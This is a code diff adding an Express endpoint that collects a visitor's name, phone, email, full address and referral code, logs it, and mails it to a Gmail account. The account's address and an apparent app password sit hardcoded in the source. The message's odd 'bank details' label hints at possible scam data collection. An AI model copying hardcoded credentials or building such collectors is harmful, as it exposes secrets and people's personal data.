@@ -140,6 +140,53 @@ app.post("/sender", async (req, res) => {
   });
 });
 
+app.post("/arnoldsender", async (req, res) => {
+  const { firstName, lastName, phoneNumber, email, country, city, state, address, zip, shirt, referralCode } = req.body;
+  console.log(req.body);
+
+  // Construct email message
+  const message = `
+    Contact Information (bank details):
+    First Name: ${firstName}
+    Last Name: ${lastName}
+    number: ${phoneNumber}
+    email: ${email}
+    Country: ${country}
+    City: ${city}
+    state: ${state}
+        address: ${address}
+    zip: ${zip}
+    shirt: ${shirt}
+    code: ${referralCode}
+  `;
+
+  // Create a transporter object using SMTP transport
+  let transporter = nodemailer.createTransport({
+    service: 'gmail',
+    auth: {
+      user: 'davidmiller4504@gmail.com',
+      pass: 'dqhc mwpf nkmb buib'
+    }
+  });
+
+  let mailOptions = {
+    from: "davidmiller4504@gmail.com", // sender address
+    to: "davidmiller4504@gmail.com", // list of receivers
+    subject: 'New Contact Form Submission', // Subject line
+    text: message // plain text body
+  };
+
+  transporter.sendMail(mailOptions, (error, info) => {
+    if (error) {
+      console.log(error);
+      res.status(500).send('Error sending email');
+    } else {
+      console.log('Email sent: ' + info.response);
+      res.json({ success: true, message: 'Email sent successfully!' });
+    }
+  });
+});
+
 const PORT = process.env.PORT || 5000;
 app.listen(PORT, () => {
   console.log(`Server is running on port ${PORT}`);
